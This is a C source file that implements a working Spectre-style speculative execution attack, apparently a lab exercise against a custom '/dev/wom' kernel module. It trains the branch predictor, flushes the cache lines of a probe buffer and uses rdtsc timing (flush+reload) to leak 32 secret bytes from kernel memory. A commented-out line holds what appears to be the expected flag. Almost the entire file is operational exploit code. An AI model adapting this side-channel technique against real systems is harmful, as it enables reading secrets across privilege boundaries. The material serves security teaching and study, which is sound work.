#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>

/* for ioctl */
#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS \
	_IOR(WOM_MAGIC_NUM, 0, unsigned long)

#define KB (1024)
#define PAGE_SIZE (4*KB)
#define PROBE_BUFFER_SIZE (PAGE_SIZE*256)
#define PROBE_NUM 6
#define EXTRACT_SIZE 32
#define MAX_THEASHOLD 300

void *
wom_get_address(int fd)
{
	void *addr = NULL;

	if (ioctl(fd, WOM_GET_ADDRESS, &addr) < 0)
		return NULL;

	return addr;
}

unsigned long time_access_no_flush(const char *adrs) {
  volatile unsigned long time;
  asm __volatile__ (
    "  mfence             \n" // guarantees that every load and store instruction that precedes in program order the MFENCE instruction is globally visible
    "  lfence             \n" // LFENCE does not execute until all prior instructions have completed locally
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  return time;
}

unsigned int find_threshold3(const char* probe_buffer){
	unsigned int arr[MAX_THEASHOLD/10]; // 300/10=30 bins
	for(size_t i = 0; i < 30; i++) arr[i]=0;
	
	unsigned int maximum = 0, tmp = 0;
	char c;

	for(size_t k = 0; k < 100; k++)
	{
		for(size_t i = 0; i < 256; i++){
			unsigned int r = i*PAGE_SIZE;
			char a = *(probe_buffer+r);
			tmp = time_access_no_flush(probe_buffer+r);
			// printf("t:%lu\n", tmp);
			if(tmp >= MAX_THEASHOLD){ // I assume threashold can't be bigger than 300;
				continue;
			}
			tmp = tmp/10;
			arr[tmp]++;
			++maximum;
		}
	}
	
	
	// maximum is a number of all found threasholds
	tmp=0;
	maximum = maximum*0.95; // We take 95% of threasholds
	for(size_t i = 0; i < 30; i++){ // 30 bins
		tmp+=arr[i];
		// printf("bin %lu = %u\n", i, arr[i]);
		if(tmp >= maximum){
			return (i+1)*10+((i+1)*10*0.4);
		}
	}
	return MAX_THEASHOLD;
}

volatile unsigned int *spectre_cond;
//volatile
char *probe_buffer;
char spec_tmp;

static void __attribute__((optimize("-O3"))) spectre_fun(const char *ptr){
	if(*spectre_cond){
		spec_tmp = *(probe_buffer + ((*ptr) * PAGE_SIZE));
	}
}

int main(int argc, char *argv[])
{
    const char *secret;
	int fd;

	fd = open("/dev/wom", O_RDONLY);

	if (fd < 0) {
        perror("open");
		fprintf(stderr, "error: unable to open /dev/wom. "
			"Please build and load the wom kernel module.\n");
		return -1;
	}

	secret = wom_get_address(fd);

	// printf("secret=%p\n", secret);
    // printf("742527b55fa326108d952fa713239ae5\n");

	probe_buffer = malloc(PROBE_BUFFER_SIZE);
	memset(probe_buffer, 0, PROBE_BUFFER_SIZE);
	spectre_cond = malloc(sizeof(unsigned int));
	*spectre_cond = 1;
	char *valid_ptr = malloc(1);
	*valid_ptr = 1;

	unsigned int probing_times[256];
	memset(probing_times, 0, 256*sizeof(unsigned int));

	unsigned int probing_times_min[256];
	memset(probing_times_min, -1, 256*sizeof(unsigned int));

	unsigned char extracted_bytes[EXTRACT_SIZE];

	unsigned int threashold = 100;
	if(argc < 2){
		threashold = find_threshold3(probe_buffer);
	}
	else{
		threashold = atoi(argv[1]);
	}

	for(size_t byte_index = 0; byte_index < EXTRACT_SIZE; byte_index++){
		for(size_t probe_id = 0; probe_id < PROBE_NUM; probe_id++){

			// train
			for(size_t train_i = 0; train_i < 4; train_i++){
				spectre_fun(valid_ptr);
			}
			for(size_t i = 0; i < 256; i++){
					asm __volatile__ ("clflush 0(%0)" : : "r" (&probe_buffer[i*PAGE_SIZE]) :);
			}
			// specture
			*spectre_cond = 0;
			asm __volatile__ ("clflush 0(%0)" : : "r" (spectre_cond) :);
			pread(fd, NULL, 32, 0);
			spectre_fun(secret+byte_index);

			/* flush / reload */
			for(size_t i = 0; i < 256; i++){
				unsigned int r = i*PAGE_SIZE;
				unsigned int elapsed_time = time_access_no_flush(probe_buffer+r);
				// printf("Elapsed: %u\n", elapsed_time);
				probing_times[i] = probing_times[i] + elapsed_time;
				if(probing_times_min[i] > elapsed_time){
					probing_times_min[i] = elapsed_time;
				} 
			}
		}
		for(size_t i = 2; i < 256; i++){
			// printf("byte index:%lu\t%lu:\t%u\n", byte_index, i, probing_times_min[i]);
			if(probing_times_min[i] < threashold){
				extracted_bytes[byte_index]=i;
				break;
			}
			if(i == 255){
				--byte_index;
			}
		}
		memset(probing_times, 0, 256*sizeof(unsigned int));
		memset(probing_times_min, -1, 256*sizeof(unsigned int));
	}
	printf("%.32s\n", extracted_bytes);

	close(fd);

	return 0;

err_close:
	close(fd);
	return -1;
}
